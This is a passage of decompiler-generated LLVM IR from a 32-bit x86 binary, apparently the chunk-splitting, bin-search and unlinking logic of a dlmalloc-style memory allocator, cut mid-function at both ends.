dec_label_pc_804ff04:                             ; preds = %dec_label_pc_804fee7
  %v1_804ff04 = add i32 %v1_804fef0, add (i32 ptrtoint (i32* @global_var_805ba4c.57 to i32), i32 12)
  %v2_804ff04 = inttoptr i32 %v1_804ff04 to i32*
  %v3_804ff04 = load i32, i32* %v2_804ff04, align 4
  store i32 %v3_804ff04, i32* @ebx, align 4
  %v0_804ff07 = load i32, i32* @edi, align 4
  %v2_804ff07 = add i32 %v3_804ff04, 4
  %v3_804ff07 = inttoptr i32 %v2_804ff07 to i32*
  %v4_804ff07 = load i32, i32* %v3_804ff07, align 4
  %v10_804ff07 = icmp ult i32 %v0_804ff07, %v4_804ff07
  %v1_804ff0a = icmp eq i1 %v10_804ff07, false
  br i1 %v1_804ff0a, label %dec_label_pc_804ff12, label %dec_label_pc_804ff30

dec_label_pc_804ff12:                             ; preds = %dec_label_pc_804ff04
  %v1_804ff14 = or i32 %v0_804ff07, 1
  store i32 %v1_804ff14, i32* %eax.global-to-local, align 4
  store i32 %v3_804fef7, i32* %ebx.global-to-local, align 4
  %v2_804ff28105 = add i32 %v3_804fef7, 4
  %v3_804ff28106 = inttoptr i32 %v2_804ff28105 to i32*
  %v4_804ff28107 = load i32, i32* %v3_804ff28106, align 4
  %v10_804ff28109 = icmp ult i32 %v1_804ff14, %v4_804ff28107
  br i1 %v10_804ff28109, label %dec_label_pc_804ff19, label %dec_label_pc_804ff2d

dec_label_pc_804ff19:                             ; preds = %dec_label_pc_804ff12, %dec_label_pc_804ff19
  %v0_804ff2d110 = phi i32 [ %v3_804ff1d, %dec_label_pc_804ff19 ], [ %v3_804fef7, %dec_label_pc_804ff12 ]
  store i32 %v0_804ff2d110, i32* %ecx.global-to-local, align 4
  %v1_804ff1d = add i32 %v0_804ff2d110, 8
  %v2_804ff1d = inttoptr i32 %v1_804ff1d to i32*
  %v3_804ff1d = load i32, i32* %v2_804ff1d, align 4
  store i32 %v3_804ff1d, i32* %ecx.global-to-local, align 4
  store i32 %v3_804ff1d, i32* %ebx.global-to-local, align 4
  %v2_804ff28 = add i32 %v3_804ff1d, 4
  %v3_804ff28 = inttoptr i32 %v2_804ff28 to i32*
  %v4_804ff28 = load i32, i32* %v3_804ff28, align 4
  %v10_804ff28 = icmp ult i32 %v1_804ff14, %v4_804ff28
  br i1 %v10_804ff28, label %dec_label_pc_804ff19, label %dec_label_pc_804ff2d

dec_label_pc_804ff2d:                             ; preds = %dec_label_pc_804ff19, %dec_label_pc_804ff12
  %v0_804ff2d.lcssa = phi i32 [ %v3_804fef7, %dec_label_pc_804ff12 ], [ %v3_804ff1d, %dec_label_pc_804ff19 ]
  %v1_804ff2d = add i32 %v0_804ff2d.lcssa, 12
  %v2_804ff2d = inttoptr i32 %v1_804ff2d to i32*
  %v3_804ff2d = load i32, i32* %v2_804ff2d, align 4
  store i32 %v3_804ff2d, i32* @ebx, align 4
  br label %dec_label_pc_804ff30

dec_label_pc_804ff30:                             ; preds = %dec_label_pc_804fed6, %dec_label_pc_804ff04, %dec_label_pc_804fee7, %dec_label_pc_804ff2d
  %v0_804ff30 = phi i32 [ %v0_804fee9, %dec_label_pc_804fee7 ], [ %v0_804fee9, %dec_label_pc_804ff2d ], [ %v0_804fee9, %dec_label_pc_804ff04 ], [ %v2_804fed8, %dec_label_pc_804fed6 ]
  %stack_var_-64.1 = phi i32 [ %v3_804fef7, %dec_label_pc_804fee7 ], [ %v0_804ff2d.lcssa, %dec_label_pc_804ff2d ], [ %v2_804fef0, %dec_label_pc_804ff04 ], [ %v3_804fee2, %dec_label_pc_804fed6 ]
  %v1_804ff32 = urem i32 %v0_804ff30, 32
  %v2_804ff32 = icmp eq i32 %v1_804ff32, 0
  store i32 %v1_804ff32, i32* %esi.global-to-local, align 4
  store i32 %v1_804ff32, i32* %ecx.global-to-local, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_804ff3c = sdiv i32 %v0_804ff30, 32
  store i32 %v2_804ff3c, i32* %edx.global-to-local, align 4
  br i1 %v2_804ff32, label %dec_label_pc_804ff58, label %bb

bb:                                               ; preds = %dec_label_pc_804ff30
  %v5_804ff3f = shl i32 1, %v1_804ff32
  store i32 %v5_804ff3f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ff58

dec_label_pc_804ff58:                             ; preds = %dec_label_pc_804ff30, %bb
  %v5_804ff41 = phi i32 [ 1, %dec_label_pc_804ff30 ], [ %v5_804ff3f, %bb ]
  %v1_804ff41 = mul nsw i32 %v2_804ff3c, 4
  %v2_804ff41 = add i32 %v1_804ff41, ptrtoint (i32* @global_var_805bd54.61 to i32)
  %v3_804ff41 = inttoptr i32 %v2_804ff41 to i32*
  %v4_804ff41 = load i32, i32* %v3_804ff41, align 4
  %v6_804ff41 = or i32 %v4_804ff41, %v5_804ff41
  store i32 %v6_804ff41, i32* %v3_804ff41, align 4
  %v0_804ff48 = load i32, i32* @ebx, align 4
  %v1_804ff48 = load i32, i32* @ebp, align 4
  %v2_804ff48 = add i32 %v1_804ff48, 12
  %v3_804ff48 = inttoptr i32 %v2_804ff48 to i32*
  store i32 %v0_804ff48, i32* %v3_804ff48, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_804ff4f = load i32, i32* @ebp, align 4
  %v2_804ff4f = add i32 %v1_804ff4f, 8
  %v3_804ff4f = inttoptr i32 %v2_804ff4f to i32*
  store i32 %stack_var_-64.1, i32* %v3_804ff4f, align 4
  %v0_804ff52 = load i32, i32* @ebp, align 4
  %v1_804ff52 = load i32, i32* @esi, align 4
  %v2_804ff52 = add i32 %v1_804ff52, 12
  %v3_804ff52 = inttoptr i32 %v2_804ff52 to i32*
  store i32 %v0_804ff52, i32* %v3_804ff52, align 4
  %v0_804ff55 = load i32, i32* @ebp, align 4
  %v1_804ff55 = load i32, i32* @ebx, align 4
  %v2_804ff55 = add i32 %v1_804ff55, 8
  %v3_804ff55 = inttoptr i32 %v2_804ff55 to i32*
  store i32 %v0_804ff55, i32* %v3_804ff55, align 4
  %v0_804ff58 = load i32, i32* @global_var_805ba60.60, align 32
  store i32 %v0_804ff58, i32* @ebp, align 4
  %v9_804ff5e = icmp eq i32 %v0_804ff58, 134593108
  %v1_804ff64 = icmp eq i1 %v9_804ff5e, false
  br i1 %v1_804ff64, label %dec_label_pc_804fe87, label %dec_label_pc_804ff6a

dec_label_pc_804ff6a:                             ; preds = %dec_label_pc_804ff58, %dec_label_pc_804ff58.preheader
  br i1 %v8_804fe1b, label %dec_label_pc_804fff8, label %dec_label_pc_804ff78

dec_label_pc_804ff78:                             ; preds = %dec_label_pc_804ff6a
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_804ff7c = mul i32 %stack_var_-40.0.ph, 8
  %v2_804ff7c = add i32 %v1_804ff7c, ptrtoint (i32* @global_var_805ba4c.57 to i32)
  store i32 %v2_804ff7c, i32* %edx.global-to-local, align 4
  %v1_804ff83 = add i32 %v1_804ff7c, add (i32 ptrtoint (i32* @global_var_805ba4c.57 to i32), i32 12)
  %v2_804ff83 = inttoptr i32 %v1_804ff83 to i32*
  %storemerge1.pre = load i32, i32* %v2_804ff83, align 4
  br label %dec_label_pc_804fff4

dec_label_pc_804ff88:                             ; preds = %dec_label_pc_804fff4
  %v1_804ff88 = add i32 %v4_804ff9f, 4
  %v2_804ff88 = inttoptr i32 %v1_804ff88 to i32*
  %v3_804ff88 = load i32, i32* %v2_804ff88, align 4
  store i32 %v3_804ff88, i32* %ebx.global-to-local, align 4
  %v1_804ff8b = add i32 %v4_804ff9f, 12
  %v2_804ff8b = inttoptr i32 %v1_804ff8b to i32*
  %v3_804ff8b = load i32, i32* %v2_804ff8b, align 4
  store i32 %v3_804ff8b, i32* @ecx, align 4
  %v1_804ff8e = and i32 %v3_804ff88, -4
  store i32 %v1_804ff8e, i32* @ebx, align 4
  %v10_804ff91 = icmp ult i32 %v1_804ff8e, %v1_8050172
  br i1 %v10_804ff91, label %dec_label_pc_804fff4, label %dec_label_pc_804ff97

dec_label_pc_804ff97:                             ; preds = %dec_label_pc_804ff88
  %v1_804ff97 = add i32 %v4_804ff9f, 8
  %v2_804ff97 = inttoptr i32 %v1_804ff97 to i32*
  %v3_804ff97 = load i32, i32* %v2_804ff97, align 4
  store i32 %v3_804ff97, i32* @edx, align 4
  %v1_804ff9a = add i32 %v3_804ff97, 12
  %v2_804ff9a = inttoptr i32 %v1_804ff9a to i32*
  %v3_804ff9a = load i32, i32* %v2_804ff9a, align 4
  %v15_804ff9a = icmp eq i32 %v3_804ff9a, %v4_804ff9f
  %v1_804ff9d = icmp eq i1 %v15_804ff9a, false
  br i1 %v1_804ff9d, label %dec_label_pc_804ffa4, label %dec_label_pc_804ff9f

dec_label_pc_804ff9f:                             ; preds = %dec_label_pc_804ff97
  %v1_804ff9f = add i32 %v3_804ff8b, 8
  %v2_804ff9f = inttoptr i32 %v1_804ff9f to i32*
  %v3_804ff9f = load i32, i32* %v2_804ff9f, align 4
  %v15_804ff9f = icmp eq i32 %v3_804ff9f, %v4_804ff9f
  br i1 %v15_804ff9f, label %dec_label_pc_804ffa9, label %dec_label_pc_804ffa4

dec_label_pc_804ffa4:                             ; preds = %dec_label_pc_804ff9f, %dec_label_pc_804ff97
  %v0_804ffa4 = call i32 @function_805090c()
  store i32 %v0_804ffa4, i32* %eax.global-to-local, align 4
  %v0_804ffa9.pre = load i32, i32* @ebx, align 4
  %v0_804ffaf.pre = load i32, i32* @ecx, align 4
  %v1_804ffaf.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804ffa9

dec_label_pc_804ffa9:                             ; preds = %dec_label_pc_804ff9f, %dec_label_pc_804ffa4
  %v1_804ffaf = phi i32 [ %v3_804ff97, %dec_label_pc_804ff9f ], [ %v1_804ffaf.pre, %dec_label_pc_804ffa4 ]
  %v0_804ffaf = phi i32 [ %v3_804ff8b, %dec_label_pc_804ff9f ], [ %v0_804ffaf.pre, %dec_label_pc_804ffa4 ]
  %v0_804ffa9 = phi i32 [ %v1_804ff8e, %dec_label_pc_804ff9f ], [ %v0_804ffa9.pre, %dec_label_pc_804ffa4 ]
  %v5_804ffab = sub i32 %v0_804ffa9, %v1_8050172
  store i32 %v5_804ffab, i32* %esi.global-to-local, align 4
  %v2_804ffaf = add i32 %v1_804ffaf, 12
  %v3_804ffaf = inttoptr i32 %v2_804ffaf to i32*
  store i32 %v0_804ffaf, i32* %v3_804ffaf, align 4
  %v0_804ffb2 = load i32, i32* @edx, align 4
  %v1_804ffb2 = load i32, i32* @ecx, align 4
  %v2_804ffb2 = add i32 %v1_804ffb2, 8
  %v3_804ffb2 = inttoptr i32 %v2_804ffb2 to i32*
  store i32 %v0_804ffb2, i32* %v3_804ffb2, align 4
  %v0_804ffb5 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ffb5 = add i32 %v0_804ffb5, 8
  store i32 %v1_804ffb5, i32* %ecx.global-to-local, align 4
  %v0_804ffb8 = load i32, i32* %esi.global-to-local, align 4
  %tmp127 = icmp ult i32 %v0_804ffb8, 16
  br i1 %tmp127, label %dec_label_pc_80504e7, label %dec_label_pc_804ffc1

dec_label_pc_804ffc1:                             ; preds = %dec_label_pc_804ffa9
  %v2_804ffc5 = add i32 %v0_804ffb5, %v1_8050172
  store i32 %v2_804ffc5, i32* %edx.global-to-local, align 4
  %v1_804ffc8 = or i32 %v1_8050172, 1
  store i32 %v1_804ffc8, i32* %ebx.global-to-local, align 4
  %v2_804ffcb = add i32 %v0_804ffb5, 4
  %v3_804ffcb = inttoptr i32 %v2_804ffcb to i32*
  store i32 %v1_804ffc8, i32* %v3_804ffcb, align 4
  %v0_804ffce = load i32, i32* %esi.global-to-local, align 4
  %v1_804ffd0 = or i32 %v0_804ffce, 1
  store i32 %v1_804ffd0, i32* %eax.global-to-local, align 4
  %v0_804ffd3 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ffd3 = load i32, i32* @ebp, align 4
  %v2_804ffd3 = add i32 %v1_804ffd3, 8
  %v3_804ffd3 = inttoptr i32 %v2_804ffd3 to i32*
  store i32 %v0_804ffd3, i32* %v3_804ffd3, align 4
  %v0_804ffd6 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ffd6 = load i32, i32* @ebp, align 4
  %v2_804ffd6 = add i32 %v1_804ffd6, 12
  %v3_804ffd6 = inttoptr i32 %v2_804ffd6 to i32*
  store i32 %v0_804ffd6, i32* %v3_804ffd6, align 4
  %v0_804ffd9 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ffd9 = add i32 %v0_804ffd9, 8
  %v2_804ffd9 = inttoptr i32 %v1_804ffd9 to i32*
  store i32 ptrtoint (i32* @global_var_805ba54.59 to i32), i32* %v2_804ffd9, align 4
  %v0_804ffe0 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ffe0 = add i32 %v0_804ffe0, 12
  %v2_804ffe0 = inttoptr i32 %v1_804ffe0 to i32*
  store i32 ptrtoint (i32* @global_var_805ba54.59 to i32), i32* %v2_804ffe0, align 4
  %v0_804ffe7 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ffe7 = load i32, i32* %edx.global-to-local, align 4
  %v2_804ffe7 = add i32 %v1_804ffe7, 4
  %v3_804ffe7 = inttoptr i32 %v2_804ffe7 to i32*
  store i32 %v0_804ffe7, i32* %v3_804ffe7, align 4
  %v0_804ffea = load i32, i32* %esi.global-to-local, align 4
  %v1_804ffea = load i32, i32* %edx.global-to-local, align 4
  %v3_804ffea = add i32 %v1_804ffea, %v0_804ffea
  %v4_804ffea = inttoptr i32 %v3_804ffea to i32*
  store i32 %v0_804ffea, i32* %v4_804ffea, align 4
  br label %dec_label_pc_80504ec

dec_label_pc_804fff4:                             ; preds = %dec_label_pc_804ff88, %dec_label_pc_804ff78
  %v4_804ff9f = phi i32 [ %storemerge1.pre, %dec_label_pc_804ff78 ], [ %v3_804ff8b, %dec_label_pc_804ff88 ]
  store i32 %v4_804ff9f, i32* %eax.global-to-local, align 4
  %v12_804fff4 = icmp eq i32 %v4_804ff9f, %v2_804ff7c
  %v1_804fff6 = icmp eq i1 %v12_804fff4, false
  br i1 %v1_804fff6, label %dec_label_pc_804ff88, label %dec_label_pc_804fff8.loopexit

dec_label_pc_804fff8.loopexit:                    ; preds = %dec_label_pc_804fff4
  br label %dec_label_pc_804fff8

dec_label_pc_804fff8:                             ; preds = %dec_label_pc_804fff8.loopexit, %dec_label_pc_804ff6a
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_8050001 = add i32 %stack_var_-40.0.ph, 1
  store i32 %v1_8050001, i32* %ecx.global-to-local, align 4
  %v2_8050004 = udiv i32 %v1_8050001, 32
  store i32 %v2_8050004, i32* @edi, align 4
  %v1_8050007 = mul nuw nsw i32 %v2_8050004, 4
  %v2_8050007 = add i32 %v1_8050007, ptrtoint (i32* @global_var_805bd54.61 to i32)
  %v3_8050007 = inttoptr i32 %v2_8050007 to i32*
  %v4_8050007 = load i32, i32* %v3_8050007, align 4
  store i32 %v4_8050007, i32* %edx.global-to-local, align 4
  %v1_805000e = mul i32 %v1_8050001, 8
  %v2_805000e = add i32 %v1_805000e, ptrtoint (i32* @global_var_805ba4c.57 to i32)
  store i32 %v2_805000e, i32* %ebx.global-to-local, align 4
  %v1_8050015 = urem i32 %v1_8050001, 32
  %v2_8050015 = icmp eq i32 %v1_8050015, 0
  store i32 %v1_8050015, i32* %ecx.global-to-local, align 4
  br i1 %v2_8050015, label %.preheader, label %bb86

bb86:                                             ; preds = %dec_label_pc_804fff8
  %v5_8050018 = shl i32 1, %v1_8050015
  store i32 %v5_8050018, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_804fff8, %bb86, %dec_label_pc_8050059
  %v1_805001a = phi i32 [ %v1_805001a.pre, %dec_label_pc_8050059 ], [ %v4_8050007, %bb86 ], [ %v4_8050007, %dec_label_pc_804fff8 ]
  %v0_805001e = phi i32 [ %v0_805001a.pre, %dec_label_pc_8050059 ], [ %v5_8050018, %bb86 ], [ 1, %dec_label_pc_804fff8 ]
  %tmp87 = icmp ule i32 %v0_805001e, %v1_805001a
  %v1_805001e = icmp eq i32 %v0_805001e, 0
  %v1_8050020 = icmp eq i1 %v1_805001e, false
  %or.cond = and i1 %tmp87, %v1_8050020
  br i1 %or.cond, label %dec_label_pc_805001e.dec_label_pc_805004e.preheader_crit_edge, label %dec_label_pc_8050022.preheader

dec_label_pc_805001e.dec_label_pc_805004e.preheader_crit_edge: ; preds = %.preheader
  %v0_80500497.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805004e.preheader

dec_label_pc_8050022.preheader:                   ; preds = %.preheader
  %v0_8050022.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8050022

dec_label_pc_8050022:                             ; preds = %dec_label_pc_8050022.preheader, %dec_label_pc_805002c
  %v0_8050022 = phi i32 [ %v0_8050022.pre, %dec_label_pc_8050022.preheader ], [ %v1_8050022, %dec_label_pc_805002c ]
  %v1_8050022 = add i32 %v0_8050022, 1
  store i32 %v1_8050022, i32* @edi, align 4
  %v6_8050026 = icmp ugt i32 %v1_8050022, 2
  br i1 %v6_8050026, label %dec_label_pc_80500dd.loopexit, label %dec_label_pc_805002c

dec_label_pc_805002c:                             ; preds = %dec_label_pc_8050022
  %v1_805002c = mul i32 %v1_8050022, 4
  %v2_805002c = add i32 %v1_805002c, ptrtoint (i32* @global_var_805bd54.61 to i32)
  %v3_805002c = inttoptr i32 %v2_805002c to i32*
  %v4_805002c = load i32, i32* %v3_805002c, align 4
  store i32 %v4_805002c, i32* %edx.global-to-local, align 4
  %v1_8050033 = icmp eq i32 %v4_805002c, 0
  br i1 %v1_8050033, label %dec_label_pc_8050022, label %dec_label_pc_8050037

dec_label_pc_8050037:                             ; preds = %dec_label_pc_805002c
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_805003e = mul i32 %v1_8050022, 256
  store i32 %v2_805003e, i32* %eax.global-to-local, align 4
  %v1_8050041 = add i32 %v2_805003e, ptrtoint (i32* @global_var_805ba4c.57 to i32)
  store i32 %v1_8050041, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805004e.preheader

dec_label_pc_805004e.preheader:                   ; preds = %dec_label_pc_805001e.dec_label_pc_805004e.preheader_crit_edge, %dec_label_pc_8050037
  %v0_80500497 = phi i32 [ %v1_8050041, %dec_label_pc_8050037 ], [ %v0_80500497.pre, %dec_label_pc_805001e.dec_label_pc_805004e.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_8050037 ], [ %v0_805001e, %dec_label_pc_805001e.dec_label_pc_805004e.preheader_crit_edge ]
  %v0_805005f = phi i32 [ %v4_805002c, %dec_label_pc_8050037 ], [ %v1_805001a, %dec_label_pc_805001e.dec_label_pc_805004e.preheader_crit_edge ]
  %v2_805004e4 = and i32 %v0_805005f, %esi.promoted
  %v3_805004e5 = icmp eq i32 %v2_805004e4, 0
  br i1 %v3_805004e5, label %dec_label_pc_8050049, label %dec_label_pc_8050052

dec_label_pc_8050049:                             ; preds = %dec_label_pc_805004e.preheader, %dec_label_pc_8050049
  %v2_805004c18 = phi i32 [ %v2_805004c, %dec_label_pc_8050049 ], [ %esi.promoted, %dec_label_pc_805004e.preheader ]
  %v0_80500498 = phi i32 [ %v1_8050049, %dec_label_pc_8050049 ], [ %v0_80500497, %dec_label_pc_805004e.preheader ]
  %v1_8050049 = add i32 %v0_80500498, 8
  %v2_805004c = mul i32 %v2_805004c18, 2
  %v2_805004e = and i32 %v2_805004c, %v0_805005f
  %v3_805004e = icmp eq i32 %v2_805004e, 0
  br i1 %v3_805004e, label %dec_label_pc_8050049, label %dec_label_pc_805004e.dec_label_pc_8050052_crit_edge

dec_label_pc_805004e.dec_label_pc_8050052_crit_edge: ; preds = %dec_label_pc_8050049
  store i32 %v1_8050049, i32* %ebx.global-to-local, align 4
  store i32 %v2_805004c, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8050052

dec_label_pc_8050052:                             ; preds = %dec_label_pc_805004e.dec_label_pc_8050052_crit_edge, %dec_label_pc_805004e.preheader
  %v0_8050059 = phi i32 [ %v2_805004c, %dec_label_pc_805004e.dec_label_pc_8050052_crit_edge ], [ %esi.promoted, %dec_label_pc_805004e.preheader ]
  %v1_805007c = phi i32 [ %v1_8050049, %dec_label_pc_805004e.dec_label_pc_8050052_crit_edge ], [ %v0_80500497, %dec_label_pc_805004e.preheader ]
  %v1_8050052 = add i32 %v1_805007c, 12
  %v2_8050052 = inttoptr i32 %v1_8050052 to i32*
  %v3_8050052 = load i32, i32* %v2_8050052, align 4
  store i32 %v3_8050052, i32* %ecx.global-to-local, align 4
  %v12_8050055 = icmp eq i32 %v3_8050052, %v1_805007c
  %v1_8050057 = icmp eq i1 %v12_8050055, false
  br i1 %v1_8050057, label %dec_label_pc_805006d, label %dec_label_pc_8050059

dec_label_pc_8050059:                             ; preds = %dec_label_pc_8050052
  %v2_805005b = mul i32 %v0_8050059, 2
  store i32 %v2_805005b, i32* %esi.global-to-local, align 4
  %v1_805005d = sub i32 -1, %v0_8050059
  store i32 %v1_805005d, i32* %eax.global-to-local, align 4
  %v2_805005f = and i32 %v0_805005f, %v1_805005d
  store i32 %v2_805005f, i32* %edx.global-to-local, align 4
  %v1_8050061 = add i32 %v3_8050052, 8
  store i32 %v1_8050061, i32* %ebx.global-to-local, align 4
  %v1_8050064 = load i32, i32* @edi, align 4
  %v2_8050064 = mul i32 %v1_8050064, 4
  %v3_8050064 = add i32 %v2_8050064, ptrtoint (i32* @global_var_805bd54.61 to i32)
  %v4_8050064 = inttoptr i32 %v3_8050064 to i32*
  store i32 %v2_805005f, i32* %v4_8050064, align 4
  %v0_805001a.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_805001a.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_805006d:                             ; preds = %dec_label_pc_8050052
  %v1_805006d = add i32 %v3_8050052, 4
  %v2_805006d = inttoptr i32 %v1_805006d to i32*
  %v3_805006d = load i32, i32* %v2_805006d, align 4
  store i32 %v3_805006d, i32* %edx.global-to-local, align 4
  %v1_8050070 = add i32 %v3_8050052, 12
  %v2_8050070 = inttoptr i32 %v1_8050070 to i32*
  %v3_8050070 = load i32, i32* %v2_8050070, align 4
  store i32 %v3_8050070, i32* %eax.global-to-local, align 4
  %v1_8050073 = and i32 %v3_805006d, -4
  store i32 %v1_8050073, i32* %edx.global-to-local, align 4
  %v5_8050078 = sub i32 %v1_8050073, %v1_8050172
  store i32 %v5_8050078, i32* %esi.global-to-local, align 4
  store i32 %v3_8050070, i32* %v2_8050052, align 4
  %v0_805007f = load i32, i32* %ebx.global-to-local, align 4
  %v1_805007f = load i32, i32* %eax.global-to-local, align 4
  %v2_805007f = add i32 %v1_805007f, 8
  %v3_805007f = inttoptr i32 %v2_805007f to i32*
  store i32 %v0_805007f, i32* %v3_805007f, align 4
  %v0_8050082 = load i32, i32* %esi.global-to-local, align 4
  %tmp128 = icmp ult i32 %v0_8050082, 16
  %v0_8050087 = load i32, i32* %ecx.global-to-local, align 4
  br i1 %tmp128, label %dec_label_pc_8050087, label %dec_label_pc_805008e

dec_label_pc_8050087:                             ; preds = %dec_label_pc_805006d
  %v1_8050087 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050087 = add i32 %v0_8050087, 4
  %v3_8050087 = add i32 %v2_8050087, %v1_8050087
  %v4_8050087 = inttoptr i32 %v3_8050087 to i32*
  %v5_8050087 = load i32, i32* %v4_8050087, align 4
  %v6_8050087 = or i32 %v5_8050087, 1
  store i32 %v6_8050087, i32* %v4_8050087, align 4
  br label %dec_label_pc_80500d5

dec_label_pc_805008e:                             ; preds = %dec_label_pc_805006d
  %v2_8050092 = add i32 %v0_8050087, %v1_8050172
  store i32 %v2_8050092, i32* %eax.global-to-local, align 4
  %v1_805009b = load i32, i32* @ebp, align 4
  %v2_805009b = add i32 %v1_805009b, 8
  %v3_805009b = inttoptr i32 %v2_805009b to i32*
  store i32 %v2_8050092, i32* %v3_805009b, align 4
  %v0_805009e = load i32, i32* %eax.global-to-local, align 4
  %v1_805009e = load i32, i32* @ebp, align 4
  %v2_805009e = add i32 %v1_805009e, 12
  %v3_805009e = inttoptr i32 %v2_805009e to i32*
  store i32 %v0_805009e, i32* %v3_805009e, align 4
  %v0_80500a1 = load i32, i32* %eax.global-to-local, align 4
  %v1_80500a1 = add i32 %v0_80500a1, 8
  %v2_80500a1 = inttoptr i32 %v1_80500a1 to i32*
  store i32 ptrtoint (i32* @global_var_805ba54.59 to i32), i32* %v2_80500a1, align 4
  %v0_80500a8 = load i32, i32* %eax.global-to-local, align 4
  %v1_80500a8 = add i32 %v0_80500a8, 12
  %v2_80500a8 = inttoptr i32 %v1_80500a8 to i32*
  store i32 ptrtoint (i32* @global_var_805ba54.59 to i32), i32* %v2_80500a8, align 4
  %v0_80500af = load i32, i32* @global_var_805ba50.58, align 16
  %v4_80500b5 = load i32, i32* %eax.global-to-local, align 4
  %v5_80500b5 = select i1 %v8_804fe1b, i32 %v4_80500b5, i32 %v0_80500af
  %v4_80500b8 = or i32 %v1_8050172, 1
  store i32 %v5_80500b5, i32* @global_var_805ba50.58, align 16
  %v0_80500c3 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_80500b8, i32* %ebx.global-to-local, align 4
  %v1_80500c9 = or i32 %v0_80500c3, 1
  store i32 %v1_80500c9, i32* %edx.global-to-local, align 4
  %v3_80500cc = add i32 %v0_80500c3, %v4_80500b5
  %v4_80500cc = inttoptr i32 %v3_80500cc to i32*
  store i32 %v0_80500c3, i32* %v4_80500cc, align 4
  %v0_80500cf = load i32, i32* %ebx.global-to-local, align 4
  %v1_80500cf = load i32, i32* %ecx.global-to-local, align 4
  %v2_80500cf = add i32 %v1_80500cf, 4
  %v3_80500cf = inttoptr i32 %v2_80500cf to i32*
  store i32 %v0_80500cf, i32* %v3_80500cf, align 4
  %v0_80500d2 = load i32, i32* %edx.global-to-local, align 4
  %v1_80500d2 = load i32, i32* %eax.global-to-local, align 4
  %v2_80500d2 = add i32 %v1_80500d2, 4
  %v3_80500d2 = inttoptr i32 %v2_80500d2 to i32*
  store i32 %v0_80500d2, i32* %v3_80500d2, align 4
  br label %dec_label_pc_80500d5

dec_label_pc_80500d5:                             ; preds = %dec_label_pc_80501c9, %dec_label_pc_8050087, %dec_label_pc_805008e
  %v0_80500d5 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80500d5 = add i32 %v0_80500d5, 8
  store i32 %v1_80500d5, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80504fd

dec_label_pc_80500dd.loopexit:                    ; preds = %dec_label_pc_8050022
  br label %dec_label_pc_80500dd

dec_label_pc_80500dd:                             ; preds = %dec_label_pc_80500dd.loopexit, %dec_label_pc_804fddd, %dec_label_pc_804fde5
  %v0_80500dd = load i32, i32* @global_var_805ba4c.57, align 4
  store i32 %v0_80500dd, i32* @ebx, align 4
  store i32 %v1_8050172, i32* %esi.global-to-local, align 4
  %v1_80500e7 = add i32 %v0_80500dd, 4
  %v2_80500e7 = inttoptr i32 %v1_80500e7 to i32*
  %v3_80500e7 = load i32, i32* %v2_80500e7, align 4
  %v1_80500ea = add i32 %v1_8050172, 16
  store i32 %v1_80500ea, i32* @esi, align 4
  %v1_80500f1 = and i32 %v3_80500e7, -4
  store i32 %v1_80500f1, i32* %ecx.global-to-local, align 4
  %v7_80500f4 = icmp ult i32 %v1_80500f1, %v1_80500ea
  br i1 %v7_80500f4, label %dec_label_pc_8050114, label %dec_label_pc_80500f8

dec_label_pc_80500f8:                             ; preds = %dec_label_pc_80500dd
  %v2_80500fc = add i32 %v0_80500dd, %v1_8050172
  store i32 %v2_80500fc, i32* %edx.global-to-local, align 4
  %v1_80500ff = or i32 %v1_8050172, 1
  store i32 %v1_80500ff, i32* %eax.global-to-local, align 4
  store i32 %v2_80500fc, i32* @global_var_805ba4c.57, align 4
  store i32 %v1_80500ff, i32* %v2_80500e7, align 4
  %v0_805010b = load i32, i32* %ecx.global-to-local, align 4
  %v5_805010b = sub i32 %v0_805010b, %v1_8050172
  store i32 %v5_805010b, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805048d

dec_label_pc_8050114:                             ; preds = %dec_label_pc_80500dd
  %v0_8050114 = load i8, i8* @global_var_805ba20.56, align 32
  %v1_8050114 = and i8 %v0_8050114, 2
  %v2_8050114 = icmp eq i8 %v1_8050114, 0
  %v0_805011b = load i32, i32* @global_var_805bd7c.62, align 4
  store i32 %v0_805011b, i32* %edx.global-to-local, align 4
  br i1 %v2_8050114, label %dec_label_pc_8050148, label %dec_label_pc_8050123

dec_label_pc_8050123:                             ; preds = %dec_label_pc_8050114
  store i32 ptrtoint (i8* @global_var_805ba20.56 to i32), i32* %stack_var_-92, align 4
  %v2_805012b = call i32 @function_80505a5(i32* bitcast (i8* @global_var_805ba20.56 to i32*))
  store i32 ptrtoint (i8* @global_var_805ba20.56 to i32), i32* @ebx, align 4
  %v1_8050135 = add i32 %v1_8050172, -7
  store i32 %v1_8050135, i32* %eax.global-to-local, align 4
  store i32 %v1_8050135, i32* %stack_var_-92, align 4
  %v1_8050139 = call i32 @function_804fd76(i32 %v1_8050135)
  store i32 %v1_8050139, i32* %eax.global-to-local, align 4
  store i32 %v1_8050139, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80504fd

dec_label_pc_8050148:                             ; preds = %dec_label_pc_8050114
  store i32 %v1_8050172, i32* @ebx, align 4
  %v1_805014c = add i32 %v0_805011b, -1
  store i32 %v1_805014c, i32* @ecx, align 4
